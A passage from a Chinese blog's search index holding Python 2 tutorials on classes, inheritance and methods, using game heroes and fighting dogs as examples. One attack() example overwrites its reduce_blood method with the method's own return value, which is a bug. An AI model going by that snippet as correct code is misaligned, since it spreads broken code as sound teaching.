punctuation">,</span>power<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 定义实例属性</span>        self<span class="token punctuation">.</span>armor <span class="token operator">=</span> armor        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> blood<span class="token operator">+</span>armor<span class="token operator">*</span><span class="token number">0.5</span>    <span class="token comment" spellcheck="true"># 定义info方法来输出英雄属性，这里继承了父类的info方法并进行了重写</span>    <span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>Tank<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'护甲：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>armor<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义Assassin类作为Hero类的子类</span><span class="token keyword">class</span> <span class="token class-name">Assassin</span><span class="token punctuation">(</span>Hero<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>mana<span class="token punctuation">,</span>power<span class="token punctuation">,</span>critical_strike<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>Assassin<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>mana<span class="token punctuation">,</span>power<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power<span class="token operator">+</span>critical_strike<span class="token operator">*</span><span class="token number">0.5</span>        self<span class="token punctuation">.</span>critical_strike <span class="token operator">=</span> critical_strike    <span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>Assassin<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'暴击率：{}%'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>critical_strike<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义Master类作为Hero类的子类</span><span class="token keyword">class</span> <span class="token class-name">Master</span><span class="token punctuation">(</span>Hero<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>mana<span class="token punctuation">,</span>power<span class="token punctuation">,</span>magic<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>Master<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>mana<span class="token punctuation">,</span>power<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>magic <span class="token operator">=</span> magic        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power<span class="token operator">*</span><span class="token number">0.5</span><span class="token operator">+</span>magic    <span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>Master<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'法强：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>magic<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 实例化三个类</span>SaiEn <span class="token operator">=</span> Tank<span class="token punctuation">(</span><span class="token string">'塞恩'</span><span class="token punctuation">,</span><span class="token number">1500</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span>Jie <span class="token operator">=</span> Assassin<span class="token punctuation">(</span><span class="token string">'劫'</span><span class="token punctuation">,</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">220</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">)</span>Ali <span class="token operator">=</span> Master<span class="token punctuation">(</span><span class="token string">'阿狸'</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 调用类属性并输出当前英雄总数</span>    <span class="token keyword">print</span> <span class="token string">'当已生成{}个英雄！'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>Hero<span class="token punctuation">.</span>num_of_hero<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 调用attack方法进行10次攻击，直至英雄死亡为止</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Jie<span class="token punctuation">.</span>attack<span class="token punctuation">(</span>SaiEn<span class="token punctuation">)</span>        <span class="token keyword">if</span> SaiEn<span class="token punctuation">.</span>blood <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token comment" spellcheck="true"># 调用子类info方法，输出当前信息</span>    SaiEn<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的面向对象（上）</title>
      <link href="/posts/6c79d73f.html"/>
      <url>/posts/6c79d73f.html</url>
      
        <content type="html"><![CDATA[<h4 id="定义一个类"><a href="#定义一个类" class="headerlink" title="定义一个类"></a>定义一个类</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个类</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 实例化一个类</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 给实例赋予一个属性name</span>d1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'大黄'</span><span class="token keyword">print</span><span class="token punctuation">(</span>d1<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="在init-方法中添加属性"><a href="#在init-方法中添加属性" class="headerlink" title="在init()方法中添加属性"></a>在<strong>init</strong>()方法中添加属性</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个类</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> blood        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power<span class="token comment" spellcheck="true"># 实例化一个类并给属性赋值</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出实例的属性值</span><span class="token keyword">print</span> d1<span class="token punctuation">.</span>name<span class="token keyword">print</span> d2<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="self和默认属性"><a href="#self和默认属性" class="headerlink" title="self和默认属性"></a>self和默认属性</h4><p><strong>self就代表当前实例</strong>，在我们创建实例的时候，模板中的self就代表了我们的实例，我们可以<strong>通过self访问当前实例的属性、调用当前实例的方法</strong>：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个模板</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 此时self代表了我们要定义的实例</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> blood        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power<span class="token comment" spellcheck="true"># 实例化一个类并给属性赋值</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出实例的属性值</span><span class="token keyword">print</span> d1<span class="token punctuation">.</span>name<span class="token keyword">print</span> d2<span class="token punctuation">.</span>name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>默认属性</li></ul><p>在我们起初定义方法的时候，会有默认属性存在，比如说血量，一开始就是满血10滴，所以它就是默认属性，我们不需要在方法的参数中给它传值，直接在方法的属性中定义好即可：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个模板</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        <span class="token comment" spellcheck="true"># 设置血量为默认属性，值为10</span>        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power<span class="token comment" spellcheck="true"># 实例化一个类并给属性赋值</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出实例的属性值</span><span class="token keyword">print</span> d1<span class="token punctuation">.</span>name<span class="token keyword">print</span> d2<span class="token punctuation">.</span>name<span class="token keyword">print</span> d1<span class="token punctuation">.</span>blood<span class="token keyword">print</span> d2<span class="token punctuation">.</span>blood<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="访问属性和修改属性"><a href="#访问属性和修改属性" class="headerlink" title="访问属性和修改属性"></a>访问属性和修改属性</h4><p>这个挺简单的，print输出实例属性，随后再给实例属性重新赋值：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个模板</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        <span class="token comment" spellcheck="true"># 设置血量为默认属性，值为10</span>        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power<span class="token comment" spellcheck="true"># 实例化一个类并给属性赋值</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出实例的属性值</span><span class="token keyword">print</span> d1<span class="token punctuation">.</span>power<span class="token comment" spellcheck="true"># 修改实例的属性</span>d1<span class="token punctuation">.</span>power <span class="token operator">=</span> <span class="token number">9999</span><span class="token comment" spellcheck="true"># 输出</span><span class="token keyword">print</span> d1<span class="token punctuation">.</span>power<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="创建实例和创建多个实例"><a href="#创建实例和创建多个实例" class="headerlink" title="创建实例和创建多个实例"></a>创建实例和创建多个实例</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/10/23 16:28</span><span class="token comment" spellcheck="true"># @Author  : Shadow</span><span class="token comment" spellcheck="true"># @Site    : </span><span class="token comment" spellcheck="true"># @File    : 简单的类.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token comment" spellcheck="true"># 定义一个模板</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        <span class="token comment" spellcheck="true"># 设置血量为默认属性，值为10</span>        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power<span class="token comment" spellcheck="true"># 创建多个实例</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出实例的属性值</span><span class="token keyword">print</span> d1<span class="token punctuation">.</span>name<span class="token keyword">print</span> d2<span class="token punctuation">.</span>name<span class="token comment" spellcheck="true"># 用id()输出实例的内存地址</span><span class="token keyword">print</span> id<span class="token punctuation">(</span>d1<span class="token punctuation">)</span><span class="token keyword">print</span> id<span class="token punctuation">(</span>d2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="添加和使用方法"><a href="#添加和使用方法" class="headerlink" title="添加和使用方法"></a>添加和使用方法</h4><p>现在我们要让大黄二黑开始报自己的各项数据，所以添加一个方法bark()：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个模板</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        <span class="token comment" spellcheck="true"># 设置血量为默认属性，值为10</span>        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power    <span class="token comment" spellcheck="true"># 添加一个方法bark</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，身高{}，攻击力{}，血量{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>height<span class="token punctuation">,</span>self<span class="token punctuation">.</span>power<span class="token punctuation">,</span>self<span class="token punctuation">.</span>blood<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建多个实例</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用构造的方法</span>d1<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span>d2<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>光叫也没劲，我们构造一个attack()方法来让他们打一架吧！</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个模板</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        <span class="token comment" spellcheck="true"># 设置血量为默认属性，值为10</span>        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power    <span class="token comment" spellcheck="true"># 添加一个方法bark</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，身高{}，攻击力{}，血量{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>height<span class="token punctuation">,</span>self<span class="token punctuation">.</span>power<span class="token punctuation">,</span>self<span class="token punctuation">.</span>blood<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 再添加一个attack()方法来执行攻击这个行为</span>    <span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>dog<span class="token punctuation">)</span><span class="token punctuation">:</span>        dog<span class="token punctuation">.</span>blood <span class="token operator">=</span> dog<span class="token punctuation">.</span>blood<span class="token operator">-</span>self<span class="token punctuation">.</span>power        <span class="token keyword">if</span> dog<span class="token punctuation">.</span>blood <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'{}的剩余血量为：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>dog<span class="token punctuation">.</span>name<span class="token punctuation">,</span>dog<span class="token punctuation">.</span>blood<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'{}击杀了{}！'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>dog<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建多个实例</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 修改d1的攻击力</span>d1<span class="token punctuation">.</span>power <span class="token operator">=</span> <span class="token number">999</span><span class="token comment" spellcheck="true"># 使用构造的方法</span>d1<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span>d2<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用attack()方法让d1攻击d2，并输出d2的状态</span>d1<span class="token punctuation">.</span>attack<span class="token punctuation">(</span>d2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过方法改变属性"><a href="#通过方法改变属性" class="headerlink" title="通过方法改变属性"></a>通过方法改变属性</h4><p>即定义一个可以修改实力属性的方法，血量最低为0，不能出现负值，修改后的代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: gbk -*-</span><span class="token comment" spellcheck="true"># 定义一个模板</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        <span class="token comment" spellcheck="true"># 设置血量为默认属性，值为10</span>        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power    <span class="token comment" spellcheck="true"># 添加一个方法bark</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，身高{}，攻击力{}，血量{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>height<span class="token punctuation">,</span>self<span class="token punctuation">.</span>power<span class="token punctuation">,</span>self<span class="token punctuation">.</span>blood<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 修改attack方法，在attack中调用reduce_blood方法</span>    <span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>dog<span class="token punctuation">)</span><span class="token punctuation">:</span>        dog<span class="token punctuation">.</span>reduce_blood <span class="token operator">=</span> dog<span class="token punctuation">.</span>reduce_blood<span class="token punctuation">(</span>self<span class="token punctuation">.</span>power<span class="token punctuation">)</span>        <span class="token keyword">if</span> dog<span class="token punctuation">.</span>blood <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'{}的剩余血量为：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>dog<span class="token punctuation">.</span>name<span class="token punctuation">,</span>dog<span class="token punctuation">.</span>blood<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'{}击杀了{}！'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>dog<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 构造一个可以修改实例属性值的方法reduce_blood</span>    <span class="token keyword">def</span> <span class="token function">reduce_blood</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>reduce_value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> reduce_value <span class="token operator">></span> self<span class="token punctuation">.</span>blood<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>blood <span class="token operator">=</span> self<span class="token punctuation">.</span>blood <span class="token operator">-</span> reduce_value<span class="token comment" spellcheck="true"># 创建多个实例</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用构造的方法</span><span class="token comment" spellcheck="true"># d1.bark()</span><span class="token comment" spellcheck="true"># 通过方法reduce_blood()修改属性</span>d1<span class="token punctuation">.</span>attack<span class="token punctuation">(</span>d2<span 